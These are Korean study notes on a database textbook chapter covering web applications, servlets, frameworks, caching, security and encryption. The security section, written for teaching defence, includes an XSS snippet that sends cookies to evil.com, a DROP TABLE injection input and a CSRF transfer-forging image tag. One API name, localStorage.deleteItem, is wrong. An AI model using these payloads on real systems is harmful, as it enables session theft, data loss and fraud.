# Chapter 9: Application Development

## 개요

실제 데이터베이스 사용은 거의 전부 애플리케이션 프로그램을 통해 이루어진다. 이 챕터는 웹 기술, 서버 측 프레임워크, 클라이언트 측 코드, 애플리케이션 아키텍처, 보안, 암호화를 다룬다.

---

## 9.1 애플리케이션 프로그램과 사용자 인터페이스

### 아키텍처 진화

```
1960s: 메인프레임 + 터미널
1980s: 클라이언트-서버 (C/S) → PC가 DB에 직접 연결
         문제: 보안 취약, 클라이언트 SW 배포/업데이트 비용 큼
현재:  웹 기반 (브라우저 → 웹서버 → DB)
       모바일 앱 (모바일 → API 서버 → DB)
```

### 전형적인 3계층 구조

```
클라이언트 (브라우저/모바일)
        ↓  HTTP
웹/앱 서버 (비즈니스 로직)
        ↓  JDBC/ODBC
데이터베이스 서버
```

---

## 9.2 웹 기술 기초 (Web Fundamentals)

### URL (Uniform Resource Locator)

```
https://www.google.com/search?q=silberschatz
  │          │             │    └─ 파라미터
  │          │             └─ 경로
  │          └─ 호스트
  └─ 프로토콜 (HTTPS = HTTP + TLS)
```

### HTTP 메서드

```
GET  → URL에 파라미터 인코딩 (https://example.com/search?q=foo)
       북마크 가능, 캐시 가능, 업데이트 작업에 사용 금지
POST → 요청 바디에 파라미터 전달
       민감한 데이터, 대용량 데이터, 업데이트 작업에 사용
```

### HTML 폼

```html
<form action="PersonQuery" method="get">
  Search for:
  <select name="persontype">
    <option value="student">Student</option>
    <option value="instructor">Instructor</option>
  </select>
  Name: <input type="text" size="20" name="name">
  <input type="submit" value="submit">
</form>
```

**HTML5 입력 타입**: `date`, `time`, `number`(min/max/step), `file` 등 풍부한 유효성 검사 지원

### 세션과 쿠키

HTTP는 **비연결성(connectionless)** 프로토콜 → 연결이 요청마다 닫힘 → 세션 상태를 유지하려면 추가 메커니즘 필요.

**쿠키(Cookie)**: 서버가 클라이언트 브라우저에 저장하는 소형 텍스트 데이터

```
세션 추적 흐름:
1. 서버가 랜덤 세션 ID 생성
2. Set-Cookie: sessionid=<random_id> 응답 헤더로 전달
3. 이후 클라이언트가 모든 요청에 Cookie 헤더로 포함
4. 서버가 세션 ID로 사용자 식별
```

---

## 9.3 서블릿 (Servlets)

Java Servlet은 웹/앱 서버 내 Java 프로그램으로 HTTP 요청을 처리. CGI 방식(매 요청마다 새 프로세스)과 달리 **스레드 기반**으로 오버헤드가 훨씬 낮다.

### 서블릿 예시

```java
@WebServlet("PersonQuery")
public class PersonQueryServlet extends HttpServlet {
    public void doGet(HttpServletRequest request,
                      HttpServletResponse response)
            throws ServletException, IOException {
        response.setContentType("text/html");
        PrintWriter out = response.getWriter();

        // 세션 확인
        HttpSession session = request.getSession(false);
        if (session == null || session.getAttribute("userid") == null) {
            out.println("You are not logged in.");
            response.setHeader("Refresh", "5;url=login.html");
            return;
        }

        String persontype = request.getParameter("persontype");
        String name       = request.getParameter("name");

        // DB 쿼리 (JDBC)
        PreparedStatement pstmt;
        if (persontype.equals("student")) {
            pstmt = conn.prepareStatement(
                "SELECT ID, name, dept_name FROM student WHERE name = ?");
        } else {
            pstmt = conn.prepareStatement(
                "SELECT ID, name, dept_name FROM instructor WHERE name = ?");
        }
        pstmt.setString(1, name);
        ResultSet rs = pstmt.executeQuery();

        // HTML 출력
        out.println("<table border='1'>");
        while (rs.next()) {
            out.println("<tr><td>" + rs.getString("ID") + "</td>"
                      + "<td>" + rs.getString("name") + "</td>"
                      + "<td>" + rs.getString("dept_name") + "</td></tr>");
        }
        out.println("</table>");
        out.close();
    }
}
```

### 서블릿 세션 관리

```java
// 로그인 성공 후 세션 생성
HttpSession session = request.getSession(true);  // 새 세션 생성
session.setAttribute("userid", userId);

// 이후 요청에서 확인
HttpSession session = request.getSession(false); // 기존 세션 조회
if (session == null || session.getAttribute("userid") == null) {
    // 미인증 처리
}
```

### 서블릿 생명 주기

```
서버 시작 또는 첫 요청 → 서블릿 클래스 로드 → init()
매 요청 → 새 스레드 → service() → doGet() 또는 doPost()
타임아웃 또는 종료 → destroy()
```

---

## 9.4 서버 측 프레임워크 (Alternative Server-Side Frameworks)

### JSP (Java Server Pages)

HTML 안에 Java 코드를 내장. 서버에서 전처리되어 서블릿 코드로 변환.

```html
<html>
<body>
<%
  if (request.getParameter("name") == null) {
    out.println("Hello World");
  } else {
    out.println("Hello, " + request.getParameter("name"));
  }
%>
</body>
</html>
```

### PHP

```php
<?php
if (!isset($_REQUEST['name'])) {
    echo 'Hello World';
} else {
    echo 'Hello, ' . $_REQUEST['name'];
}
?>
```

### Django Framework (Python)

Django의 뷰(view)는 Java 서블릿과 동등한 개념. `urls.py`에서 URL을 뷰 함수에 매핑.

```python
# views.py
from django.http import HttpResponse
from django.db import connection

def person_query_view(request):
    if "username" not in request.session:
        return login_view(request)  # 미인증 시 로그인 페이지로

    persontype = request.GET.get("persontype")
    personname = request.GET.get("personname")

    if persontype == "student":
        query_tmpl = "SELECT id, name, dept_name FROM student WHERE name=%s"
    else:
        query_tmpl = "SELECT id, name, dept_name FROM instructor WHERE name=%s"

    with connection.cursor() as cursor:
        cursor.execute(query_tmpl, [personname])
        rows = cursor.fetchall()

    html = "<table border='1'>"
    for row in rows:
        html += "<tr>" + "".join(f"<td>{col}</td>" for col in row) + "</tr>"
    html += "</table>"
    return HttpResponse(html)
```

### 웹 애플리케이션 프레임워크 비교

| 프레임워크 | 언어 | 특징 |
|-----------|------|------|
| Django | Python | 풀스택, ORM, 관리자 인터페이스 |
| Ruby on Rails | Ruby | 관례 우선(Convention over Config) |
| Spring Boot | Java | 엔터프라이즈급, 의존성 주입 |
| Express | Node.js | 경량, 유연한 미들웨어 |
| ASP.NET | C# | Microsoft 생태계 |

---

## 9.5 클라이언트 측 코드와 웹 서비스

### JavaScript

**유효성 검사(Validation):**

```html
<script>
function validate() {
    var startdate = new Date(document.getElementById("start").value);
    var enddate   = new Date(document.getElementById("end").value);
    if (startdate > enddate) {
        alert("Start date > end date");
        return false;
    }
}
</script>
<form action="submitDates" onsubmit="return validate()">
    Start: <input type="date" id="start">
    End:   <input type="date" id="end">
    <input type="submit" value="Submit">
</form>
```

**동적 DOM 조작**: JavaScript로 DOM 트리를 수정해 페이지 내용을 실시간 변경.

**Ajax (Asynchronous JavaScript and XML)**:
- 비동기로 서버에서 데이터를 가져와 페이지 일부만 갱신
- JSON이 주요 데이터 형식

```javascript
// jQuery + DataTables 예시
$(document).ready(function() {
    // 자동완성 연결 (백엔드 웹서비스 호출)
    $("#name").autocomplete({ source: "/autocomplete_name" });

    // DataTables 초기화
    myTable = $("#personTable").DataTable({
        columns: [{data:"id"}, {data:"name"}, {data:"dept_name"}]
    });
});

function loadTableAsync() {
    var params = {persontype: $("#persontype").val(), name: $("#name").val()};
    var url = "/person_query_ajax?" + jQuery.param(params);
    myTable.ajax.url(url).load();  // 비동기로 JSON 데이터 로드
}
```

### RESTful 웹 서비스

```
REST (Representational State Transfer):
- 표준 HTTP 요청으로 함수 호출
- 파라미터: URL 경로 또는 쿼리 파라미터
- 응답 형식: JSON (주로) 또는 XML

예시 URL:
GET  /api/students?name=Zhang      → 학생 목록 조회
POST /api/students                 → 학생 추가
PUT  /api/students/12345           → 학생 정보 수정
DELETE /api/students/12345         → 학생 삭제
```

**"Big Web Services"(SOAP)**: XML 인코딩, WSDL 형식 API 정의, HTTP 위에 별도 프로토콜 레이어. 복잡하지만 엔터프라이즈 환경에서 사용.

### 로컬 스토리지와 오프라인 지원

HTML5 `localStorage` API:

```javascript
localStorage.setItem("key", "value");   // 저장
localStorage.getItem("key");            // 조회
localStorage.deleteItem("key");         // 삭제
// 기본 한도: 도메인당 5MB
```

**IndexedDB**: 여러 속성에 인덱스를 가진 JSON 객체를 클라이언트에 저장.

### Progressive Web Apps (PWA)

모바일 앱의 장점(오프라인, 푸시 알림, 컴파일)과 웹 앱의 장점(즉시 배포, 크로스 플랫폼)을 결합.

핵심 기술:
- **서비스 워커(Service Worker)**: 백그라운드 동기화, 푸시 알림
- HTML5 로컬 스토리지/IndexedDB
- JavaScript JIT 컴파일

---

## 9.6 애플리케이션 아키텍처

### MVC (Model-View-Controller) 아키텍처

```
┌──────────────────────────────────────────┐
│             웹 브라우저                   │
└─────────────────┬───────────────────────┘
                  │ HTTP 요청
┌─────────────────▼───────────────────────┐
│           Controller                    │
│   URL 라우팅, 인증, 세션 관리            │
├─────────────────────────────────────────┤
│             Model                       │
│   비즈니스 로직, 데이터 처리             │
├─────────────────────────────────────────┤
│          Data-Access Layer              │
│   ORM, JDBC/ODBC, SQL 추상화            │
├─────────────────────────────────────────┤
│              Database                   │
└─────────────────────────────────────────┘
              │ HTML 응답
┌─────────────▼───────────────────────────┐
│              View                       │
│   템플릿 렌더링, 디바이스별 맞춤        │
└─────────────────────────────────────────┘
```

### 비즈니스 로직 계층

- 도메인 객체(학생, 교수, 수강 등)를 추상화
- 비즈니스 규칙 강제 (예: 선수과목 미이수 학생 수강 등록 차단)
- **워크플로우(Workflow)**: 다중 참여자가 관여하는 작업 프로세스 관리 (승인, 에스컬레이션 등)

### ORM 상세

**Hibernate (Java)**:

```java
@Entity public class Student {
    @Id String ID;
    String name;
    @Column(name = "dept_name")
    String department;
    int tot_cred;
}

// HQL(Hibernate Query Language) 사용
List<Student> students = session
    .createQuery("FROM Student AS s ORDER BY s.ID ASC")
    .list();
```

**Django ORM**:

```python
class Instructor(models.Model):
    id       = models.CharField(primary_key=True, max_length=5)
    name     = models.CharField(max_length=20)
    advisees = models.ManyToManyField(Student, related_name="advisors")

# 마이그레이션: 스키마 변경 자동 추적
# python manage.py makemigrations
# python manage.py migrate
```

---

## 9.7 애플리케이션 성능

### 캐싱 기법

**1. 커넥션 풀링(Connection Pooling)**:

```
문제: JDBC 연결 생성에 수 ms 소요 → 요청마다 생성 시 병목
해결: 미리 생성된 연결 풀에서 대출/반납

DataSource ds = ...;         // 풀 설정
Connection conn = ds.getConnection();  // 풀에서 대출
// 작업 수행
conn.close();               // 풀에 반납 (실제 종료 아님)
```

**2. 쿼리 결과 캐싱**:
- 동일 쿼리의 반복 실행을 방지
- 기저 데이터 변경 시 무효화(invalidation) 필요
- 실체화 뷰(Materialized View)의 일종

**3. memcached / Redis**:

```python
# memcached 예시
key = "student:12345"
data = memcached.fetch(key)
if data is None:
    data = db.query("SELECT * FROM student WHERE ID = '12345'")
    memcached.add(key, data)
return data
```

| | memcached | Redis |
|--|-----------|-------|
| 데이터 구조 | 키-값 | 키-값, 리스트, 셋, 해시 등 |
| 지속성 | 없음 | 선택적 디스크 저장 |
| 클러스터 | 클라이언트 파티셔닝 | 내장 클러스터 |
| 자동 무효화 | 없음(수동) | 없음(수동) |

**4. 페이지 캐싱**: 완성된 HTML 응답을 캐시하여 재계산 회피.

### 병렬 처리

```
로드 밸런서
     ├─ 앱 서버 1
     ├─ 앱 서버 2  →  공유 DB
     └─ 앱 서버 3
```

- 세션 고정(Session Affinity): 같은 IP → 같은 앱 서버 라우팅
- DB 병목 해소: 캐싱 + 병렬/분산 DB

---

## 9.8 애플리케이션 보안

### SQL 인젝션 (SQL Injection)

**취약한 코드:**

```java
// 위험: 입력값을 문자열 연결로 쿼리 생성
String query = "SELECT * FROM student WHERE name LIKE '%" + name + "%'";
```

악의적 입력: `'; DROP TABLE student; --`
→ 쿼리가 `... LIKE '%'; DROP TABLE student; --%'` 로 변형

**방어:**

```java
// PreparedStatement 사용 (파라미터 바인딩)
PreparedStatement pstmt = conn.prepareStatement(
    "SELECT * FROM student WHERE name LIKE ?");
pstmt.setString(1, "%" + name + "%");
// JDBC가 자동으로 특수문자 이스케이프
```

### XSS (Cross-Site Scripting)

사용자 입력이 그대로 HTML로 출력될 때 악의적 스크립트가 실행되는 공격.

```html
<!-- 공격자가 댓글로 입력 -->
<script>document.location='http://evil.com/?cookie='+document.cookie</script>
```

**방어:**
- 사용자 입력의 HTML 태그 이스케이프 (예: `<` → `&lt;`)
- 허용된 태그만 화이트리스트로 처리
- `Content-Security-Policy` HTTP 헤더로 스크립트 실행 제한

### XSRF/CSRF (Cross-Site Request Forgery)

인증된 사용자의 브라우저를 통해 의도치 않은 요청을 서버에 보내는 공격.

```html
<!-- 악성 사이트에 심어진 코드 -->
<img src="https://mybank.com/transfermoney?amount=1000&toaccount=14523">
```

**방어:**
- GET 요청으로 데이터 변경 금지
- CSRF 토큰 사용 (Django: `{% csrf_token %}`)
- `Referer` 헤더 검증
- `SameSite=Strict` 쿠키 속성

### 인증 (Authentication)

**2단계 인증(Two-Factor Authentication)**:
```
지식 요소: 비밀번호
소유 요소: OTP 디바이스, SMS, 스마트카드, TOTP 앱
→ 두 요소가 독립적인 취약점을 가져야 의미 있음
```

**단일 로그인(SSO, Single Sign-On)**:
- LDAP: 조직 내부 중앙 인증
- SAML: 크로스 조직 인증 (예: 대학 계정으로 외부 서비스 접근)
- OAuth: 리소스 접근 권한 위임 토큰
- OpenID: SAML의 대안, 개방형 표준

**챌린지-응답 인증**:
```
1. 서버 → 클라이언트: 챌린지 문자열
2. 클라이언트: 비밀키로 챌린지 암호화
3. 클라이언트 → 서버: 암호화된 결과 전송
4. 서버: 동일 키로 복호화하여 원본 챌린지와 비교
→ 네트워크에 비밀번호가 전송되지 않음
```

### 애플리케이션 수준 인가

SQL 인가(GRANT/REVOKE)는 두 가지 이유로 세밀한 제어에 부적합:
1. 웹 애플리케이션의 DB 사용자는 단일(앱 서버 계정) → 최종 사용자 구분 불가
2. SQL은 행(row) 단위 인가 미지원

**해결책:**

```sql
-- Oracle VPD (Virtual Private Database): 함수 반환 술어를 쿼리에 자동 추가
-- 예: takes 테이블에 항상 "ID = 현재_사용자_ID" 조건 추가
create or replace function student_filter(...)
return varchar2 as
begin
    return 'ID = sys_context(''USERENV'', ''CLIENT_IDENTIFIER'')';
end;
```

PostgreSQL, SQL Server도 **행 수준 보안(Row-Level Security)** 지원.

### 감사 추적 (Audit Trail)

모든 데이터 변경 내역(누가, 언제, 무엇을 변경)을 기록.

- DB 레벨: 트리거로 감사 테이블에 기록
- 앱 레벨: 비즈니스 로직 레벨의 상세 로그 (IP, 사용자, 작업 유형)
- 보호: 로그를 별도 서버에 복사, 또는 블록체인으로 변조 방지

---

## 9.9 암호화 (Encryption and Its Applications)

### 암호화 기법

**대칭키 암호화 (Symmetric-Key Encryption)**:
- 암호화/복호화에 동일한 키 사용
- **AES(Advanced Encryption Standard)**: 128비트 블록, 키 길이 128/192/256비트
- 단점: 키 배포 문제 (안전한 키 교환 채널 필요)

**공개키 암호화 (Public-Key Encryption, Asymmetric)**:

```
공개키(Ei): 누구나 알 수 있음 → 암호화에 사용
개인키(Di): 본인만 알 수 있음 → 복호화에 사용

U1이 U2에게 기밀 전송:
  → U2의 공개키 E2로 암호화
  → U2만 자신의 개인키 D2로 복호화 가능
```

RSA 기반: 큰 두 소수 P1, P2의 곱 P1×P2를 공개, 인수분해의 어려움에 보안 근거.

**하이브리드 암호화**: 실제 통신에서는 공개키로 대칭키를 안전하게 교환 → 이후 대칭키로 데이터 암호화.

**사전 공격(Dictionary Attack) 방어**:

```
솔트(salt): 암호화 전 랜덤 비트를 데이터에 추가
예) 패스워드 해시: hash(password + random_salt)
→ 같은 값도 솔트에 따라 다른 암호문 생성
```

### DB 암호화 지원

```
레벨별 암호화:
디스크 블록 수준: 전체 DB 파일 암호화 (투명 데이터 암호화, TDE)
속성 수준:       특정 열만 암호화 (예: 신용카드 번호)

주의: PK/FK 속성은 일반적으로 암호화 불가 (조인, 인덱스 사용 불가)
      민감 데이터(SSN, 카드번호 등) 암호화 → 많은 국가에서 법적 요구사항
```

### 디지털 서명과 인증서

**디지털 서명(Digital Signature)**:
```
서명: 개인키로 데이터 암호화 → 서명된 데이터 공개
검증: 공개키로 복호화 → 원본 데이터와 일치 여부 확인

특성:
- 인증(Authentication): 특정인이 작성했음을 증명
- 부인 방지(Non-repudiation): 나중에 서명 사실 부인 불가
```

**디지털 인증서(Digital Certificate)**:
```
인증 기관(CA)이 공개키에 서명 → 공개키의 소유자를 증명

HTTPS 동작:
1. 서버가 CA 서명된 인증서를 브라우저에 제공
2. 브라우저가 인증서 체인을 루트 CA까지 검증
3. 검증된 서버 공개키로 대칭 세션 키를 안전하게 교환
4. 이후 대칭키로 암호화 통신
```

---

## 핵심 정리

### 웹 보안 위협과 대응

```
SQL 인젝션     → PreparedStatement, 파라미터 바인딩
XSS            → HTML 이스케이프, CSP 헤더
CSRF           → CSRF 토큰, SameSite 쿠키, Referer 검증
패스워드 유출  → DB 암호화 저장(솔트+해시), 접근 제어
세션 탈취      → HTTPS, 세션 타임아웃, IP 바인딩
중간자 공격    → HTTPS(인증서), HSTS
```

### 성능 최적화 레이어

```
1. 클라이언트  캐시: 브라우저 캐시, localStorage
2. CDN 캐시:    정적 리소스 엣지 서버 캐싱
3. 앱 서버 캐시: memcached/Redis (쿼리 결과, 세션)
4. 커넥션 풀:   JDBC 연결 재사용
5. DB 캐시:     버퍼 풀, 실체화 뷰
```

### 암호화 선택 기준

```
대칭키 (AES):   고속, 대용량 데이터 암호화, 키 배포 문제
공개키 (RSA):   키 배포 문제 없음, 느림 → 키 교환/서명에만 사용
하이브리드:     공개키로 대칭키 교환 → 대칭키로 데이터 암호화 (HTTPS 방식)
```

### 아키텍처 레이어 책임 분리

```
Presentation  → HTML 렌더링, UX
Controller    → 라우팅, 세션, 인증 확인
Model         → 비즈니스 규칙, 도메인 로직
Data Access   → ORM, SQL, 트랜잭션
Database      → 저장, 인덱스, 동시성 제어
```
